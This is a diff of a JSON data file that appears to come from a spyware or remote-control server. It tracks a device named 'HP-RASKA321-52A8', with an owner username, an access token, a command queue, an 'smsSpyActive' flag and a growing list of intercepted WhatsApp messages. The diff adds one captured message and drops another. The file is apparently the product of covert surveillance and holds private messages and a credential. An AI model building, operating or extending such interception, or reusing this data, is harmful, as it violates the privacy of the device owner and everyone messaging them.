@@ -108,7 +108,7 @@
     "deviceName": "HP-RASKA321-52A8",
     "ownerUsername": "Amsal.sim",
     "token": "906fc9b5e5fd7ed9167409d9979fb58b",
-    "lastSeen": 1776002226587,
+    "lastSeen": 1776002232760,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T16:02:07.690Z",
@@ -124,6 +124,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "𓆚꧁𝐿𝐸𝑍𝐴 𝐿𝑃𝑀꧂𓆚: ~ 𝗻𝗼 𝗰𝗼𝗽𝘆 𝗮𝗽𝗮𝗽𝘂𝗻 𝗹𝗮𝗰𝘂𝗿!",
+        "content": "𝗬𝗨𝗞 𝗝𝗢𝗜𝗡 𝗔𝗟𝗟 𝗚𝗕 𝗙𝗧 𝗖𝗦 𝗞𝗨, 𝗠𝗔𝗨 𝗗𝗔𝗚𝗘𝗧‼️\n\n𝗙𝗧 𝗖𝗦 𝗔𝗥𝗞𝗔𝗡𝗢𝗠𝗘𝗥𝗖𝗬 \n> https://chat.whatsapp.com/Hi0fYxtHLndC7850n5s1Y7?mode=gi_t\n\n𝗙𝗧 𝗖𝗦 𝗕𝗬 𝗔𝗖𝗔𝗖𝗔 #𝟯\n> https://chat.whatsapp.com/Gv81eAMimMcEQPcDFgnwXJ?mode=gi_t\n\n𝗙𝗧 𝗖𝗦 𝗕𝗬 𝗔𝗖𝗔𝗖𝗔 #𝟰\n> https://chat.whatsapp.com/LSEYJrDRa9I9X9YQypGaZD?mode=gi_t\n\n𝗙𝗧 𝗖𝗦 𝗕𝗬 𝗔𝗖𝗔𝗖𝗔 #𝟭\n> https://chat.whatsapp.com/KM3dRkbE01k9cNr6kQjAIe?mode=gi_t\n\n𝗙𝗧 𝗖𝗦 𝗕𝗬 𝗔𝗖𝗔𝗖𝗔 #𝟮 \n> https://chat.whatsapp.com/EpAnB81CmnH2YpIGrCsJGy?mode=gi_t\n\n𝗔𝗟𝗟 𝗜𝗡𝗙𝗢 𝗙𝗧 𝗖𝗦 \n> https://whatsapp.com/channel/0029VbCPhkmLSmbhhveHcQ1M",
+        "time": "12/04 20:57",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776002234927
+      },
       {
         "appName": "WhatsApp",
         "sender": "𝐀𝐑𝐓𝐇𝐈𝐂𝐀𝐋 𝐌𝐀𝐇𝐀𝐓𝐈𝐑 𝐃𝐋𝐌 𝐊𝐍𝐃𝐀𝐋𝐈 𝐇𝐄𝐊𝐀𝐋",
@@ -4115,14 +4123,6 @@
         "time": "12/04 00:07",
         "pkg": "com.whatsapp",
         "receivedAt": 1775927275316
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𝐀𝐑𝐓𝐇𝐈𝐂𝐀𝐋 𝐌𝐀𝐇𝐀𝐓𝐈𝐑 𝐃𝐋𝐌 𝐊𝐍𝐃𝐀𝐋𝐈 𝐇𝐄𝐊𝐀𝐋: Membalas Anda",
-        "content": "~ thinn: coba dlu",
-        "time": "12/04 00:07",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775927275228
       }
     ],
     "galleryPhotos": [],
